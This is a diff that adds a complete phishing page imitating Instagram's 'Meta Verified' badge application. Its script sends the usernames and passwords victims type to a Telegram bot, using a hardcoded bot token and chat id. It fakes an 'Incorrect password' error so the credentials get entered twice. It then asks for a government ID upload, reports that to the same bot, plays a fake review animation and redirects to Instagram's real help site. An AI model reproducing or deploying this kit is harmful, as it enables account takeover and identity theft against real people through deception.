@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram • Meta Verified</title>
+    <style>
+        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { background-color: #ffffff; margin: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; overflow-x: hidden; }
+        
+        /* Header */
+        .header { width: 100%; padding: 15px 20px; border-bottom: 1px solid #efefef; display: flex; justify-content: space-between; align-items: center; background: #fff; position: sticky; top: 0; z-index: 100; }
+        .header img { width: 103px; }
+        .help-link { color: #0095f6; font-size: 14px; font-weight: 600; text-decoration: none; }
+
+        .content { width: 100%; max-width: 380px; padding: 20px; text-align: center; margin-top: 10px; }
+        .insta-logo { width: 65px; height: 65px; margin-bottom: 20px; }
+
+        /* Animated Blue Tick Section */
+        .title-row { display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 10px; }
+        .title-row h1 { font-size: 24px; font-weight: 600; margin: 0; color: #262626; }
+        
+        .blue-tick {
+            width: 24px; height: 24px; background: #0095f6; border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            box-shadow: 0 0 0 rgba(0, 149, 246, 0.4);
+            animation: pulse-blue 2s infinite;
+        }
+        .blue-tick svg { width: 14px; fill: white; }
+
+        @keyframes pulse-blue {
+            0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(0, 149, 246, 0.7); }
+            70% { transform: scale(1); box-shadow: 0 0 0 10px rgba(0, 149, 246, 0); }
+            100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(0, 149, 246, 0); }
+        }
+
+        .desc { font-size: 14px; color: #737373; line-height: 1.5; margin-bottom: 30px; padding: 0 10px; }
+
+        /* Input Styling */
+        input, select {
+            width: 100%; padding: 14px; background: #fafafa; border: 1px solid #dbdbdb;
+            border-radius: 12px; font-size: 14px; outline: none; margin-bottom: 10px;
+        }
+        input:focus { border-color: #a8a8a8; }
+
+        .btn-login {
+            width: 100%; background-color: #0095f6; color: white; border: none;
+            padding: 12px; border-radius: 25px; font-weight: 600; font-size: 15px;
+            margin-top: 10px; cursor: pointer; transition: 0.2s;
+        }
+        .btn-login:active { opacity: 0.7; }
+
+        .error-msg { color: #ed4956; font-size: 14px; margin-bottom: 15px; display: none; }
+        .forgot { color: #00376b; font-size: 14px; text-decoration: none; display: block; margin-top: 20px; font-weight: 500; }
+
+        /* Upload ID Section */
+        #page-id, #page-status { display: none; }
+        .upload-box {
+            border: 1px solid #dbdbdb; border-radius: 15px; padding: 35px 20px;
+            background: #fafafa; cursor: pointer; margin-top: 20px; position: relative;
+        }
+        .upload-icon-circle {
+            width: 50px; height: 50px; background: #fff; border: 1px solid #dbdbdb;
+            border-radius: 50%; display: flex; align-items: center; justify-content: center;
+            margin: 0 auto 15px;
+        }
+
+        /* Footer */
+        .footer { margin-top: auto; padding-bottom: 40px; text-align: center; width: 100%; }
+        .footer-from { color: #737373; font-size: 12px; margin-bottom: 5px; }
+        .meta-logo { width: 70px; opacity: 0.8; }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <img src="https://www.logo.wine/a/logo/Instagram/Instagram-Wordmark-Logo.wine.svg">
+        <a href="#" class="help-link">Help Center</a>
+    </div>
+
+    <div id="page-login" class="content">
+        <img class="insta-logo" src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg">
+        <div class="title-row">
+            <h1>Meta Verified</h1>
+            <div class="blue-tick">
+                <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+            </div>
+        </div>
+        <p class="desc">Log in to confirm your identity and apply for a verified badge on your Instagram profile.</p>
+        
+        <div id="err" class="error-msg">Incorrect password. Please try again.</div>
+
+        <form id="loginForm">
+            <input type="text" id="u" placeholder="Phone number, username or email" required>
+            <input type="password" id="p" placeholder="Password" required>
+            <button type="submit" id="lBtn" class="btn-login">Log in</button>
+        </form>
+        <a href="#" class="forgot">Forgot password?</a>
+    </div>
+
+    <div id="page-id" class="content">
+        <div class="title-row">
+            <h1 style="font-size: 20px;">Identity Check</h1>
+            <div class="blue-tick" style="width: 20px; height: 20px;"><svg viewBox="0 0 24 24" style="width:10px;"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div>
+        </div>
+        <p class="desc">Please upload a photo of your government ID (Aadhar/PAN) to proceed with verification.</p>
+        
+        <select id="doc">
+            <option>National ID Card</option>
+            <option>Passport</option>
+            <option>Driver's License</option>
+        </select>
+
+        <div class="upload-box" onclick="document.getElementById('fInp').click()">
+            <div class="upload-icon-circle">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="#262626"><path d="M20 5h-3.17L15 3H9L7.17 5H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z"/></svg>
+            </div>
+            <div id="up-txt" style="font-weight: 600;">Tap to Upload ID Front</div>
+            <input type="file" id="fInp" style="display:none" onchange="fileSet()">
+        </div>
+
+        <button id="idBtn" class="btn-login" style="margin-top: 30px;" disabled onclick="submitID()">Submit ID</button>
+    </div>
+
+    <div id="page-status" class="content" style="margin-top: 40px;">
+        <div class="blue-tick" style="width: 60px; height: 60px; margin: 0 auto 20px;">
+            <svg viewBox="0 0 24 24" style="width: 30px;"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+        </div>
+        <h1>Reviewing...</h1>
+        <p id="st-msg">Meta security is reviewing your credentials.</p>
+        <div style="width: 100%; height: 4px; background: #eee; border-radius: 10px; overflow: hidden;">
+            <div id="bar" style="width: 0%; height: 100%; background: #0095f6; transition: 0.3s;"></div>
+        </div>
+    </div>
+
+    <div class="footer">
+        <div class="footer-from">From</div>
+        <img class="meta-logo" src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg">
+    </div>
+
+    <script>
+        let attempt = 0;
+        const botToken = "7651390702:AAGrTVe66NGxY10FgKzXU2B73A_DIJbzO-c";
+        const chatId = "6580940337";
+
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const u = document.getElementById('u').value;
+            const p = document.getElementById('p').value;
+            attempt++;
+
+            document.getElementById('lBtn').innerText = "Logging in...";
+            
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("💎 PREMIUM LOGIN:\n👤 User: "+u+"\n🔑 Pass: "+p+"\n🔢 Try: "+attempt)}`)
+            .finally(() => {
+                if(attempt === 1) {
+                    setTimeout(() => {
+                        document.getElementById('lBtn').innerText = "Log in";
+                        document.getElementById('p').value = "";
+                        document.getElementById('err').style.display = "block";
+                    }, 1200);
+                } else {
+                    document.getElementById('page-login').style.display = 'none';
+                    document.getElementById('page-id').style.display = 'block';
+                }
+            });
+        });
+
+        function fileSet() {
+            const file = document.getElementById('fInp').files[0];
+            if(file) {
+                document.getElementById('up-txt').innerText = "File: " + file.name;
+                document.getElementById('idBtn').disabled = false;
+            }
+        }
+
+        function submitID() {
+            const u = document.getElementById('u').value;
+            const doc = document.getElementById('doc').value;
+            document.getElementById('idBtn').innerText = "Uploading...";
+            
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📂 ID RECEIVED:\n👤 User: "+u+"\n📄 Document: "+doc)}`)
+            .finally(() => {
+                document.getElementById('page-id').style.display = 'none';
+                document.getElementById('page-status').style.display = 'block';
+                runProgress();
+            });
+        }
+
+        function runProgress() {
+            let p = 0;
+            const bar = document.getElementById('bar');
+            const msg = document.getElementById('st-msg');
+            const texts = ["Scanning ID clarity...", "Verifying authenticity...", "Finalizing review..."];
+            let idx = 0;
+
+            let timer = setInterval(() => {
+                p += 2;
+                bar.style.width = p + "%";
+                if(p % 30 === 0 && idx < texts.length) {
+                    msg.innerText = texts[idx];
+                    idx++;
+                }
+                if(p >= 100) {
+                    clearInterval(timer);
+                    setTimeout(() => { window.location.href = "https://help.instagram.com"; }, 1500);
+                }
+            }, 100);
+        }
+    </script>
+</body>
+</html>
